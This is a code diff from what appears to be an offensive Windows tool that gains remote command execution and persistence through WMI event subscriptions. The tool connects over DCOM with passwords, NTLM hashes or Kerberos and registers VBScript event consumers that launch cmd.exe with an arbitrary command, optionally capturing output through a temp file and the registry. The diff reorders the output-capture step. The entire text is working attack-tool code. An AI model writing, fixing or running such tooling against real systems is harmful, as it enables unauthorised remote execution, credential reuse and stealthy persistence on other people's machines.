@@ -46,15 +46,15 @@ class WMIPERSISTENCE:
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               options.aesKey, oxidResolver=False, doKerberos=options.k, kdcHost=options.dc_ip)
         generator = GenTemplate(self.__command, self.__options.with_output)
-        vb_script, save_FileName = generator.raw_Template()
-        vb_writeReg,keyName = generator.write_Reg(save_FileName)
         iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
         iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
         iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
         iWbemLevel1Login.RemRelease()
+        vb_script, save_FileName = generator.raw_Template()
         self.create_WMI_Event_Consumer(iWbemServices,vb_script)
-        self.create_WMI_Event_Consumer(iWbemServices,vb_writeReg)
         if self.__options.with_output is True:
+            vb_writeReg,keyName = generator.write_Reg(save_FileName)
+            self.create_WMI_Event_Consumer(iWbemServices,vb_writeReg)
             self.query_CommandResult(iWbemLevel1Login,keyName)
         else:
             pass
@@ -160,6 +160,7 @@ Action.Path = "c:\windows\system32\cmd.exe"
         if self.options_With_Output is True:
             template_PartTwo = r'Action.arguments = chr(34) & "/c ' + self.command + '  > C:\\Windows\\Temp\\' + save_FileName + r'" & chr(34)'
         else:
+            save_FileName=''
             template_PartTwo = r'Action.arguments = chr(34) & "/c ' + self.command + r'" & chr(34)'
         
         template_PartThree = r"""
